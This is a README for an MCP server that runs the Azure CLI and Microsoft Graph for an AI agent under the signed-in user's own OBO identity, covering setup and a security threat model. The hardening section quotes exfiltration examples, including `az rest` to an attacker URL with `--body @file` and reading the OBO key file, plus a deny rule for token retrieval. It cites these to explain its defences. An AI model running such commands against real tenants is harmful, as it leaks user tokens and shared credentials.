# azobo — per-user OBO Azure CLI + Microsoft Graph, as an MCP server

`azobo` lets an AI agent run the **full Azure CLI** and **Microsoft Graph** **as the
signed-in user**, over an MCP endpoint, using OAuth 2.0 **On-Behalf-Of (OBO)**. No
shared service-principal god-mode: every call carries the *user's own* identity and is
bounded by *their own* Azure RBAC.

Generic passthrough tools (no curated/typed wrappers — the model uses its native
`az` fluency):

- **`az_run(command)`** — the full Azure CLI: management plane, the `az ad` directory,
  **and** raw Microsoft Graph / any other endpoint via `rest --url …`.
- **`read_output(output_id)`** — page a previous command's full output if it was truncated.

(There was a separate `graph_run` tool; it's gone — `az ad` + `az rest` cover raw Graph,
so it was redundant surface.)

## Why this is PROBABLY not a giant gaping security hole

The question to answer before deploying, so let's be explicit:

1. **It acts as the user, not as a privileged robot.** Each request carries a per-user
   OAuth token; `azobo` exchanges it (OBO) for a downstream Azure/Graph token **for that
   same user**. Every call is the user — logged as them in Entra sign-in + Azure
   activity logs (real attribution, not an anonymous service principal).
2. **It can't do anything the user can't already do.** Access = the user's own Azure
   RBAC + Entra role. A Contributor scoped to one resource group is blocked everywhere
   else (`AuthorizationFailed`/403) **by Azure**, not by trusting the agent. The tool
   cannot escalate anyone.
3. **The certificate is a broker, not a key to the kingdom — and it lives in its own
   process.** The confidential-client cert can only *exchange a user's valid token* for a
   downstream token (no assertion → it mints nothing). It is held by a **separate broker
   process running as a different user**; the MCP server and the `az` subprocess reach it
   only over a local socket, and **cannot read the key file** — so arbitrary `az` can't
   exfiltrate it.
4. **No shared standing credential.** The dangerous pattern — one over-privileged
   service principal everyone shares — is exactly what OBO avoids: no shared identity to
   over-permission, no lost attribution.
5. **Two-layer model.** The app's consented API permissions are a *ceiling* on which
   audiences are reachable *at all*; each user's RBAC is the *floor* on what they can do.
   Effective access = **ceiling ∩ the user's own roles**.

What you still must protect (honest threat model):

- **The cert** (the OBO broker): held only by the broker process (own user, key `chmod
  600` owned by it) — not readable by the server or the `az` subprocess. Stealing it still
  needs a valid user assertion to be useful. On an Azure host you can drop it entirely for a
  **federated Managed Identity**; on-prem, the broker-process split is the equivalent
  isolation.
- **In-flight user tokens**: TLS the endpoint; they're short-lived bearer creds.
- **Writes are real.** `az group delete`, `az ad app create`, role assignments mutate
  the tenant as the user. Gate writes behind confirmation/step-up, not blanket auto-run.

## Architecture

```
                                          user=azobo                      user=azobo-broker
agent / MCP client ─(user bearer)─▶ azobo MCP server ─register(assertion)─▶ OBO broker ─(cert+OBO)─▶ Entra ID
   (aud = resource app)                  │  └─ validates token (JWKS)          │ (holds the cert)        │
                                         ▼                                     ▼ mint(session,scopes)    ▼
                                spawns `az` subprocess ───────────────────────┘ ◀──── downstream token ─┘
                                (gets a SESSION id, not the assertion/cert)
```

Two processes, two users. The **broker** is the only holder of the cert and the only thing
that talks to Entra. The **server** validates the incoming bearer, registers a short-lived
*session* with the broker, and hands the `az` subprocess only that opaque session id — never
the cert, never the user assertion. The subprocess mints tokens for *its* session over the
broker's local socket (group-restricted), so anything it could exfiltrate is bounded to the
calling user's own short-lived tokens — not the shared cert, not other users. The broker's
single long-lived MSAL client also gives a **shared token cache** (see below).

## Prerequisites

- Linux host, Python 3.11+, and (for TLS) nginx.
- A Microsoft Entra tenant where you can create app registrations + grant admin consent.

## Setup

### 1. App registrations (one-time, in Entra)

**Resource app** — what `azobo` authenticates as (the OBO "server"):

1. Entra → **App registrations → New**. Single tenant.
2. **Expose an API** → accept the default **Application ID URI** `api://<client-id>` →
   **Add a scope** `user_impersonation`. For prod, set **who can consent: Admins only** and
   require app assignment, so a random client app can't obtain a callable token; pair with
   `AZOBO_ALLOWED_CLIENTS` / `AZOBO_REQUIRED_SCOPE` server-side (see Security).
3. **Certificates & secrets → Certificates → Upload** the public cert (step 2 below).
4. **API permissions** → add the **delegated** downstream permissions you want reachable
   (each is a *resource* the OBO can mint a token for), then **Grant admin consent**.
   **Grant the least set you need** — these are the *ceiling* of what any token can reach
   (effective access is this ∩ the user's own RBAC); start read-only and add scopes
   deliberately, don't grant the broad ones by reflex:
   - **Azure Service Management** → `user_impersonation` — the ARM management plane.
   - **Microsoft Graph** → `User.Read` (+ `Directory.Read.All` for read-only directory,
     or `Directory.ReadWrite.All` for directory admin).
   - **Azure Storage** → `user_impersonation` — blob/queue/table data plane.
   - **Azure Key Vault** → `user_impersonation` — secret/key/cert data plane.
   - …add others (Cosmos DB, etc.) the same way. These are the *ceiling*.
5. **Manifest** → set `"requestedAccessTokenVersion": 2` (v2 tokens; the audience the
   server validates becomes the app's client-id GUID).

**Client app** — what your MCP client/agent platform signs users in with: a normal
confidential client (client secret), with a **Redirect URI** matching your MCP client's
OAuth callback, and an **API permission** for the resource app's `user_impersonation`
scope (admin-consented). Reuse an existing one if your platform already has it.

> ⚠️ Do **not** grant the resource app `Application.ReadWrite.All` unless you
> specifically want the agent to manage app registrations — an app that can rewrite app
> regs can escalate itself. If you do, gate it hard behind step-up.

### 2. The OBO certificate

```bash
openssl req -x509 -newkey rsa:2048 -days 730 -nodes \
  -keyout obo.key -out obo.crt -subj "/CN=azobo-obo"
# Upload obo.crt to the resource app (1.3). The key is owned by the BROKER user only
# (set in step 4); nothing on the `az` side can read it. Thumbprint (no colons):
openssl x509 -in obo.crt -noout -fingerprint -sha1 | sed 's/.*=//; s/://g'
```

### 3. Install

```bash
python3 -m venv /opt/azobo/venv
/opt/azobo/venv/bin/pip install -r requirements.txt
install -m 755 server.py azobo obo_broker.py /opt/azobo/
```

### 4. Configure (two users, two env files)

The broker holds the cert as its own user; the server connects over a group socket.

```bash
sudo groupadd -f azobo
sudo useradd --system --no-create-home --shell /usr/sbin/nologin -g azobo azobo-broker
sudo useradd --system --no-create-home --shell /usr/sbin/nologin -g azobo azobo
sudo install -d /etc/azobo
sudo install -d -o azobo -g azobo -m 700 /var/lib/azobo            # audit log dir

# Broker env + key — readable only by the broker user:
sudo cp broker.env.example /etc/azobo/broker.env                   # fill in values
sudo cp obo.key /etc/azobo/obo.key ; sudo cp obo.crt /etc/azobo/obo.crt
sudo chown azobo-broker:azobo /etc/azobo/broker.env /etc/azobo/obo.key
sudo chmod 640 /etc/azobo/broker.env ; sudo chmod 600 /etc/azobo/obo.key

# Server env — no cert in it; readable by the server user:
sudo cp azobo.env.example /etc/azobo/azobo.env                     # fill in values
sudo chown azobo:azobo /etc/azobo/azobo.env ; sudo chmod 640 /etc/azobo/azobo.env
```

### 5. Run

```bash
sudo cp deploy/azobo-broker.service deploy/azobo-mcp.service /etc/systemd/system/
sudo systemctl enable --now azobo-broker              # holds the cert; creates the socket
sudo systemctl enable --now azobo-mcp                 # listens on 127.0.0.1:8782 (Requires broker)
sudo cp deploy/nginx-azobo.conf /etc/nginx/sites-enabled/   # set your FQDN + TLS cert
sudo nginx -t && sudo systemctl reload nginx
```

Point your MCP client at `https://<your-fqdn>/` with per-user OAuth: the **client app**
(id + secret) and scope `api://<resource-client-id>/user_impersonation offline_access`.

## Using it (and the gotchas)

- Write `az` commands as in a terminal, minus the leading `az`:
  `network vnet show -g RG -n NAME -o json`, `vm list -o table`, `ad app list`.
- **One command per call** — no shell `&&` or pipes (`| jq`). Filter with az's native
  `--query` (JMESPath) and `-o json/table/tsv`; the agent parses JSON itself.
- **Subscription context does not persist** between calls — pass `--subscription <id>`
  inline. `account list` shows accessible subscriptions.
- **`az ad` works** (directory); for raw Graph use `az rest --url https://graph.microsoft.com/v1.0/…`
  (or `az rest --resource <r> --url <u>` for other audiences).
- **Data plane** (blob contents, Key Vault secret values) needs BOTH the API permission
  (1.4) AND the *user's own* data-plane role (Storage Blob Data Reader, KV Secrets User)
  — management roles / Global Admin do **not** grant data access. Use `--auth-mode login`.
- `AuthorizationFailed` / 403 / empty outside a user's scope is **expected** — their RBAC
  boundary, not a bug, and not something to route around.

## How it works (the trick)

Azure CLI can't be handed a raw token via `az login`. `azobo` is a small wrapper that
monkeypatches `azure-cli`'s `Profile` to inject an OBO token instead of using the local
MSAL account cache — three methods: `get_login_credentials` (ARM, honors
`--subscription`), `load_cached_subscriptions` (live subscription list), and
`get_raw_token` (what `az ad` / `az rest` use). The result: the model writes ordinary
`az` (and `az ad`) commands and they run as the user.

The wrapper itself holds **no** broker material — it's given an opaque, short-lived
**session id** and mints each token by asking the **broker** over a local Unix socket
(`obo_broker.py`). The broker is the only process that loads the cert and the only one that
talks to Entra; it runs as a separate user. So the cert and the user assertion never enter
the `az` subprocess. See `obo_broker.py`, `azobo`, and `server.py`.

## Security & hardening

This server runs the full Azure CLI as the signed-in user; treat it accordingly.

- **Token validation is on by default** (`AZOBO_VALIDATE_TOKENS=true`): every request's
  bearer is verified (signature via the tenant JWKS, audience, issuer, expiry) before any
  claim is trusted. This is what makes `read_output`'s per-user isolation real — it never
  does an OBO exchange, so it can't lean on Entra to reject a forged token.
- **Two processes, two users, sandboxed.** The cert lives only in `azobo-broker.service`
  (user `azobo-broker`); the MCP server (`azobo-mcp.service`, user `azobo`) reaches it over
  a group-restricted local socket and can't read the key. Both units run with
  `ProtectSystem=strict`, dropped capabilities, a syscall filter, `PrivateTmp`, and
  `UMask=0077`. Never run either as root.
- **Command output is retained in memory only** (TTL'd, owner-scoped by immutable `oid`) —
  no Key Vault secrets / Graph data are written to disk. Only the audit log (metadata) is
  persisted, 0600.
- **Least privilege:** grant the resource app only the downstream permissions you actually
  need (§1.4), start read-only, and remember the consented permissions are just the
  *ceiling* — effective access is that ceiling ∩ each user's own RBAC.
- **Resource ceilings bound a runaway.** The unit sets `LimitFSIZE` (a local write past
  the cap dies with SIGXFSZ — kills a `az ... download` of a huge blob), `MemoryMax`, and
  `TasksMax`; the server caps **captured** bytes per command (`AZOBO_MAX_CAPTURE_BYTES`,
  killing the child if exceeded) and the total bytes retained in memory. A runaway can kill
  the *service*, not the host.
- **Caller authorization, enforced at the broker.** The broker (the credential boundary)
  validates each assertion itself at register — signature via JWKS, audience, issuer, plus
  optional `AZOBO_REQUIRED_SCOPE` (token `scp`) and `AZOBO_ALLOWED_CLIENTS` (calling app's
  `azp`/`appid`). The server validates too; the broker doesn't trust the caller. Prefer
  **admin-only consent / app assignment** on the resource app so a random client can't
  obtain a callable token in the first place.
- **`az rest` is restricted to Microsoft/Azure endpoints, not denied.** An OBO token is only
  valid at the Microsoft first-party service it's audienced to, so there is no legitimate
  reason for `az rest`/`invoke` to target any other host — the `--url` host is checked
  against `AZOBO_REST_ALLOWED_DOMAINS` (default: commercial Azure/Microsoft) and anything
  else is refused. This keeps raw Graph/ARM working while killing
  `rest --url https://attacker… --body @file` token/file exfil. (Residual: an attacker
  controlling an Azure resource — their own `*.blob.core.windows.net` — is bounded and
  traceable; close even that with an egress proxy allow-list.)
- **Read-only by default.** The example env ships `AZOBO_READONLY=true` (Graph GET-only;
  refuses mutating `az` verbs incl. `rest`/`invoke` non-GET) — the dangerous default is the
  safe one. Set it `false` to allow writes (then per-user RBAC is the boundary). Note this is
  **defense-in-depth, not a hard boundary** — a best-effort blocklist, not a command
  allowlist. For a *real* read-only deployment, assign users only **Reader** RBAC + read-only
  consent; RBAC is authoritative.
- **Egress.** The unit blocks IMDS/link-local (`IPAddressDeny=169.254.0.0/16 fe80::/10`) so
  `az rest`/SSRF can't lift the *host's* managed-identity token. ⚠️ `IPAddressDeny` needs
  cgroup/BPF — on some container hosts it silently no-ops; verify with
  `systemctl show azobo-mcp -p IPAddressDeny`. The `rest` domain allow-list (above) handles
  outbound token exfil at the app layer; for an untrusted deployment, also force outbound
  through a **proxy/firewall allow-list of Azure endpoints only**.

> **Lock-it-down recipe (less-trusted callers):** `AZOBO_READONLY=true` +
> `AZOBO_REQUIRED_SCOPE` + `AZOBO_ALLOWED_CLIENTS` set + keep the default `rest` domain
> allow-list + `AZOBO_DENY_COMMANDS=account get-access-token` + an egress proxy allow-listing
> only Azure endpoints. For trusted operators on-prem, the defaults (validate on, rest
> domain-restricted) are reasonable; flip `READONLY=false` if they need writes.
- The wrapped CLI runs with `AZURE_CORE_DISABLE_DYNAMIC_INSTALL=yes` (no extension code
  auto-runs) and a **minimal environment** (only the vars the wrapper needs).
- **Token caching (no Entra hammering).** The broker's single long-lived MSAL client caches
  OBO tokens in memory keyed by (user, scopes), serving repeats and refreshing ~5 min before
  expiry — so back-to-back commands by the same user don't re-hit Entra. (In-memory only;
  OBO tokens are never written to disk, and a broker restart just re-warms.)
- **Disk:** `LimitFSIZE` caps a *single* file; a batch of many sub-limit files can still fill
  the writable paths. For untrusted use, mount `/var/lib/azobo` (and `/tmp`) as size-limited
  tmpfs / with a disk quota, or don't expose persistent writable paths to the child at all.

### Threat model

The boundary this tool relies on is **per-user Azure RBAC**: every call is the signed-in
user, so it can do only what that user could already do from their own machine. A 403 is
the boundary working. It is built for **trusted operators**, not anonymous internet users.

**The crown-jewel residual — the shared cert — is closed by the broker split.** Earlier
versions read the OBO key inside the `az` subprocess, so `az rest --body @/etc/azobo/obo.key`
could exfiltrate the cert that's *shared across all users* (offline OBO for anyone, forever
— far worse than one session). Now the cert lives only in the broker process (separate user,
key `chmod 600`), the server validates tokens but never reads the cert, and the subprocess
gets only a short-lived session id. The cert and the user assertion **never enter the `az`
subprocess**, so there's nothing of that value for `az rest` to read.

What remains (inherent to OBO, and much smaller): a malicious `az` command in a session can
still mint *that one user's* tokens. `az rest` is domain-locked to Microsoft endpoints, so it
can't POST them to an arbitrary attacker URL — but an attacker controlling their own Azure
resource (e.g. a storage account they own) could still receive them. That's the user's own
authority: short-lived, online, auditable, revocable by ending the session — nothing like the
shared, offline, durable cert. An egress proxy allow-listing only the Azure endpoints you use
closes even that.

**Deployment posture (pick one, write it down):**
- *Broker split, trusted operators on-prem (this design, as deployed):* the shared-cert exfil
  path is closed — the cert lives in a separate-user broker, unreadable from the `az` side, and
  the user assertion never enters the subprocess. Acceptable for operators; keep
  `AZOBO_READONLY=true` unless they need writes.
- *Federated Managed Identity (Azure):* no key file at all — strongest. The broker split is the
  on-prem equivalent of this.
- *Less than fully trusted callers:* apply the lock-it-down recipe above (read-only,
  scope/client allow-lists, the `rest` domain-lock, deny `account get-access-token`) **and** an
  egress proxy allow-list — or don't expose it.

## License

**GNU Affero General Public License v3.0** (`AGPL-3.0-or-later`) — see [LICENSE](LICENSE).

Why AGPL and not plain GPL: this is a *network service*. Plain GPLv3 lets anyone run a
modified version as a hosted service without ever releasing their changes (the "SaaS
loophole"). AGPLv3 closes it — §13 requires that anyone who interacts with a modified
version **over a network** be offered the complete corresponding source. So a third party
can use and build on this, but cannot take it private and offer it as a closed service.

SPDX-License-Identifier: AGPL-3.0-or-later
